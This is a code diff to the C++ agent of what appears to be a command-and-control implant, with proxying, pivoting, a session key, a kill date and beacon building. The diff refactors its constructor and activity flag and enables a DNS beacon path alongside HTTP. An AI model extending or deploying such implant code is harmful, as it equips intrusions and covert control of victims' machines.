@@ -17,31 +17,24 @@ void Agent::operator delete(void* p) noexcept
 
 Agent::Agent()
 {
-	info = new AgentInfo();
-	config = new AgentConfig();
-	commander = new Commander(this);
-	downloader = new Downloader(config->download_chunk_size);
-	jober = new JobsController();
+	info        = new AgentInfo();
+	config      = new AgentConfig();
+	commander   = new Commander(this);
+	downloader  = new Downloader(config->download_chunk_size);
+	jober       = new JobsController();
 	memorysaver = new MemorySaver();
-	proxyfire = new Proxyfire();
-	pivotter = new Pivotter();
+	proxyfire   = new Proxyfire();
+	pivotter    = new Pivotter();
 
 	SessionKey = (PBYTE) MemAllocLocal(16);
 	for (int i = 0; i < 16; i++)
 		SessionKey[i] = GenerateRandom32() % 0x100;
-
-	this->config->active = true;
-}
-
-void Agent::SetActive(BOOL state)
-{
-	this->config->active = state;
 }
 
 BOOL Agent::IsActive()
 {
 	ULONG now = GetSystemTimeAsUnixTimestamp();
-	return this->config->active && !(this->config->kill_date && now >= this->config->kill_date);
+	return this->Active && !(this->config->kill_date && now >= this->config->kill_date);
 }
 
 ULONG Agent::GetWorkingSleep() 
@@ -120,7 +113,7 @@ BYTE* Agent::BuildBeat(ULONG* size)
 	MemFreeLocal((LPVOID*)&this->info->username,      StrLenA(this->info->username));
 	MemFreeLocal((LPVOID*)&this->info->process_name,  StrLenA(this->info->process_name));
 
-#if defined(BEACON_HTTP) 
+#if defined(BEACON_HTTP) || defined(BEACON_DNS)
 
 	ULONG beat_size = packer->datasize();
 	PBYTE beat      = packer->data();
